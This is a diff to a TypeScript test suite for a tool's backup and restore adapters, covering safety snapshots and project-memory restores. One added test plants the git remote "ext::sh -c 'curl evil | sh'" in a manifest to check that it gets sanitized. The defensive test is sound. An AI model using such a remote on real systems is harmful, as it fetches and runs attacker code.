@@ -634,6 +634,8 @@ describe("backup adapters", () => {
       repositoryRoot: repository.rootDir,
       managedPath: settings.path,
       includeProjects: false,
+      snapshotPath: path.join(tempDir, "restore-snapshot"),
+      matchedProjectPaths: [],
     });
     expect(restored.changedFiles).toEqual(["skills/demo/run.sh"]);
     const mode = (await fs.stat(path.join(muxRoot, "skills/demo/run.sh"))).mode;
@@ -676,6 +678,8 @@ describe("backup adapters", () => {
       repositoryRoot: prepared.rootDir,
       managedPath: prepared.managedPath,
       includeProjects: false,
+      snapshotPath: path.join(tempDir, "restore-snapshot"),
+      matchedProjectPaths: [],
     });
     expect(restored.changedFiles).toEqual(["AGENTS.md"]);
     expect(await fs.readFile(path.join(muxRoot, "AGENTS.md"), "utf-8")).toBe(
@@ -761,6 +765,8 @@ describe("backup adapters", () => {
       repositoryRoot: prepared.rootDir,
       managedPath: prepared.managedPath,
       includeProjects: false,
+      snapshotPath: path.join(tempDir, "restore-snapshot"),
+      matchedProjectPaths: [],
     });
     expect(restored.changedFiles).toEqual(["AGENTS.md"]);
     expect(await fs.readFile(path.join(muxRoot, "AGENTS.md"), "utf-8")).toBe("canonical\n");
@@ -816,6 +822,8 @@ describe("backup adapters", () => {
       repositoryRoot: prepared.rootDir,
       managedPath: prepared.managedPath,
       includeProjects: false,
+      snapshotPath: path.join(tempDir, "restore-snapshot"),
+      matchedProjectPaths: [],
     });
     expect(restored.changedFiles).toEqual(["AGENTS.md"]);
     expect(await fs.readFile(path.join(muxRoot, "AGENTS.md"), "utf-8")).toBe("canonical\n");
@@ -873,6 +881,8 @@ describe("backup adapters", () => {
       repositoryRoot: prepared.rootDir,
       managedPath: prepared.managedPath,
       includeProjects: false,
+      snapshotPath: path.join(tempDir, "restore-snapshot"),
+      matchedProjectPaths: [],
     });
     expect(restored.changedFiles).toEqual(["AGENTS.md"]);
     expect(await fs.readFile(path.join(muxRoot, "AGENTS.md"), "utf-8")).toBe(
@@ -923,6 +933,8 @@ describe("backup adapters", () => {
       repositoryRoot: prepared.rootDir,
       managedPath: prepared.managedPath,
       includeProjects: false,
+      snapshotPath: path.join(tempDir, "restore-snapshot"),
+      matchedProjectPaths: [],
     });
     expect(restored.changedFiles).toEqual(["AGENTS.md"]);
     expect(await fs.readFile(path.join(muxRoot, "AGENTS.md"), "utf-8")).toBe(
@@ -1117,6 +1129,8 @@ describe("backup adapters", () => {
       repositoryRoot: repository.rootDir,
       managedPath: settings.path,
       includeProjects: false,
+      snapshotPath: path.join(tempDir, "restore-snapshot"),
+      matchedProjectPaths: [],
     });
 
     expect(await fs.readFile(path.join(muxRoot, "AGENTS.md"), "utf-8")).toBe("backed up\n");
@@ -1156,6 +1170,8 @@ describe("backup adapters", () => {
         repositoryRoot: repository.rootDir,
         managedPath: settings.path,
         includeProjects: false,
+        snapshotPath: path.join(tempDir, "restore-snapshot"),
+        matchedProjectPaths: [],
       });
       throw new Error("Expected the lost preferences write to be reported");
     } catch (error) {
@@ -1192,6 +1208,8 @@ describe("backup adapters", () => {
       repositoryRoot: repository.rootDir,
       managedPath: settings.path,
       includeProjects: false,
+      snapshotPath: path.join(tempDir, "restore-snapshot"),
+      matchedProjectPaths: [],
     });
 
     expect(config.state.userPreferences?.appearance?.theme).toBe("dark");
@@ -1208,7 +1226,7 @@ describe("backup adapters", () => {
     const payload = createBackupPayloadStore({ config });
     const snapshotRoot = path.join(tempDir, "snapshot");
 
-    await payload.writeSafetySnapshot(snapshotRoot, { includeProjectMemory: false });
+    await payload.writeSafetySnapshot(snapshotRoot);
 
     expect(await fs.readFile(path.join(snapshotRoot, "AGENTS.md"), "utf-8")).toBe(
       "before restore\n"
@@ -1233,7 +1251,7 @@ describe("backup adapters", () => {
     // snapshot is unredacted, so anything wider than the owner leaks MCP credentials.
     const previousUmask = process.umask(0o022);
     try {
-      await payload.writeSafetySnapshot(snapshotRoot, { includeProjectMemory: false });
+      await payload.writeSafetySnapshot(snapshotRoot);
     } finally {
       process.umask(previousUmask);
     }
@@ -1284,7 +1302,7 @@ describe("backup adapters", () => {
     const payload = createBackupPayloadStore({ config });
     const snapshotRoot = path.join(tempDir, "case-snapshot");
 
-    await payload.writeSafetySnapshot(snapshotRoot, { includeProjectMemory: false });
+    await payload.writeSafetySnapshot(snapshotRoot);
 
     expect(await fs.readFile(path.join(snapshotRoot, "skills/demo/Foo.md"), "utf-8")).toBe(
       "upper\n"
@@ -1503,14 +1521,59 @@ describe("backup adapters project bundle", () => {
     expect(preview.projectBundleSkipped).toBe(false);
     expect(preview.changes).toContainEqual({ status: "M", path: memoryPath });
 
-    const restored = await payload.restore({
+    const validated = await payload.validateRestore({
       repositoryRoot: repository.rootDir,
       managedPath: settings.path,
       includeProjects: true,
     });
+    expect(validated.matchedProjectPaths).toEqual([project]);
+
+    const snapshotPath = path.join(tempDir, "restore-snapshot");
+    const restored = await payload.restore({
+      repositoryRoot: repository.rootDir,
+      managedPath: settings.path,
+      includeProjects: true,
+      snapshotPath,
+      matchedProjectPaths: validated.matchedProjectPaths,
+    });
     expect(restored.changedFiles).toContain(memoryPath);
+    expect(restored.restoredProjectMemory).toEqual([{ projectPath: project, files: [memoryPath] }]);
     expect(await fs.readFile(path.join(muxRoot, ...memoryPath.split("/")), "utf-8")).toBe(
       "backup version\n"
+    );
+    // The overwritten local edit is recoverable from the snapshot the restore took itself.
+    expect(
+      await fs.readFile(
+        path.join(snapshotPath, "project-bundle", ...memoryPath.split("/")),
+        "utf-8"
+      )
+    ).toBe("local edit\n");
+  });
+
+  it("does not overwrite a project that became matched only after validation", async () => {
+    const project = path.join(tempDir, "projects", "alpha");
+    registerProject(project);
+    await seedProjectMemory(project, "notes.md", "backup version\n");
+    await writeFixtureFile(muxRoot, "AGENTS.md", "instructions\n");
+    const memoryPath = `memory/project/${projectMemoryDirName(project)}/notes.md`;
+
+    const { repository, payload } = await exportBundle();
+    await seedProjectMemory(project, "notes.md", "local edit\n");
+
+    // Validation classified nothing as matched (as if the project was registered by another
+    // window afterwards); the recomputed plan now matches it, but the snapshot never
+    // covered it, so the restore must leave it alone.
+    const restored = await payload.restore({
+      repositoryRoot: repository.rootDir,
+      managedPath: settings.path,
+      includeProjects: true,
+      snapshotPath: path.join(tempDir, "restore-snapshot"),
+      matchedProjectPaths: [],
+    });
+    expect(restored.changedFiles).not.toContain(memoryPath);
+    expect(restored.restoredProjectMemory).toEqual([]);
+    expect(await fs.readFile(path.join(muxRoot, ...memoryPath.split("/")), "utf-8")).toBe(
+      "local edit\n"
     );
   });
 
@@ -1555,6 +1618,8 @@ describe("backup adapters project bundle", () => {
       repositoryRoot: repository.rootDir,
       managedPath: settings.path,
       includeProjects: true,
+      snapshotPath: path.join(tempDir, "restore-snapshot"),
+      matchedProjectPaths: [],
     });
     expect(restored.changedFiles.some((file) => file.startsWith("memory/project"))).toBe(false);
     expect(
@@ -1563,6 +1628,36 @@ describe("backup adapters project bundle", () => {
         () => false
       )
     ).toBe(false);
+  });
+
+  it("re-sanitizes a repository-controlled remote before presenting a candidate", async () => {
+    const project = path.join(tempDir, "projects", "alpha");
+    registerProject(project);
+    await seedProjectMemory(project, "notes.md", "alpha notes\n");
+    await writeFixtureFile(muxRoot, "AGENTS.md", "instructions\n");
+    const { repository, payload } = await exportBundle();
+    config.state.projects.delete(project);
+
+    // Export sanitized the remote; a crafted checkout swaps in an executable one.
+    const manifestPath = path.join(
+      repository.rootDir,
+      settings.path,
+      "project-bundle",
+      "manifest.json"
+    );
+    const manifest = JSON.parse(await fs.readFile(manifestPath, "utf-8")) as {
+      projects: Array<{ gitRemote?: string }>;
+    };
+    manifest.projects[0].gitRemote = "ext::sh -c 'curl evil | sh'";
+    await fs.writeFile(manifestPath, JSON.stringify(manifest), "utf-8");
+
+    const preview = await payload.previewRestore({
+      repositoryRoot: repository.rootDir,
+      managedPath: settings.path,
+      includeProjects: true,
+    });
+    expect(preview.projectImports).toHaveLength(1);
+    expect(preview.projectImports[0]?.gitRemote).toBeUndefined();
   });
 
   it("imports approved project memory re-keyed to the target path, add-only", async () => {
@@ -1634,6 +1729,8 @@ describe("backup adapters project bundle", () => {
       repositoryRoot: repository.rootDir,
       managedPath: settings.path,
       includeProjects: false,
+      snapshotPath: path.join(tempDir, "restore-snapshot"),
+      matchedProjectPaths: [],
     });
     expect(restored.projectBundleSkipped).toBe(true);
 
@@ -1647,32 +1744,42 @@ describe("backup adapters project bundle", () => {
     expect((error as { code?: string }).code).toBe("INVALID_BACKUP");
   });
 
-  it("covers registered project memory in the safety snapshot only when asked", async () => {
-    const project = path.join(tempDir, "projects", "alpha");
-    registerProject(project);
-    await seedProjectMemory(project, "notes.md", "before restore\n");
+  it("snapshots only the matched project memory a restore can overwrite", async () => {
+    const matchedProject = path.join(tempDir, "projects", "alpha");
+    registerProject(matchedProject);
+    await seedProjectMemory(matchedProject, "notes.md", "backup version\n");
     await writeFixtureFile(muxRoot, "AGENTS.md", "instructions\n");
-    const payload = createBackupPayloadStore({ config });
+    const { repository, payload } = await exportBundle();
 
-    const withProjects = path.join(tempDir, "snapshot-with");
-    await payload.writeSafetySnapshot(withProjects, { includeProjectMemory: true });
-    const snapshotFile = path.join(
-      withProjects,
-      "project-bundle",
-      "memory",
-      "project",
-      projectMemoryDirName(project),
-      "notes.md"
-    );
-    expect(await fs.readFile(snapshotFile, "utf-8")).toBe("before restore\n");
+    // Registered here but absent from the backup: nothing can overwrite its memory, so it
+    // must neither appear in the snapshot nor count against the bundle limits.
+    const unrelatedProject = path.join(tempDir, "projects", "beta");
+    registerProject(unrelatedProject);
+    await seedProjectMemory(unrelatedProject, "local.md", "local only\n");
+    await seedProjectMemory(matchedProject, "notes.md", "local edit\n");
 
-    const withoutProjects = path.join(tempDir, "snapshot-without");
-    await payload.writeSafetySnapshot(withoutProjects, { includeProjectMemory: false });
+    const snapshotPath = path.join(tempDir, "restore-snapshot");
+    await payload.writeSafetySnapshot(snapshotPath);
     expect(
-      await fs.stat(path.join(withoutProjects, "project-bundle")).then(
+      await fs.stat(path.join(snapshotPath, "project-bundle")).then(
         () => true,
         () => false
       )
     ).toBe(false);
+
+    await payload.restore({
+      repositoryRoot: repository.rootDir,
+      managedPath: settings.path,
+      includeProjects: true,
+      snapshotPath,
+      matchedProjectPaths: [matchedProject],
+    });
+    const snapshotBundle = JSON.parse(
+      await fs.readFile(path.join(snapshotPath, "project-bundle", "manifest.json"), "utf-8")
+    ) as { projects: Array<{ path: string }>; files: Array<{ path: string }> };
+    expect(snapshotBundle.projects.map((entry) => entry.path)).toEqual([matchedProject]);
+    expect(snapshotBundle.files.map((file) => file.path)).toEqual([
+      `memory/project/${projectMemoryDirName(matchedProject)}/notes.md`,
+    ]);
   });
 });
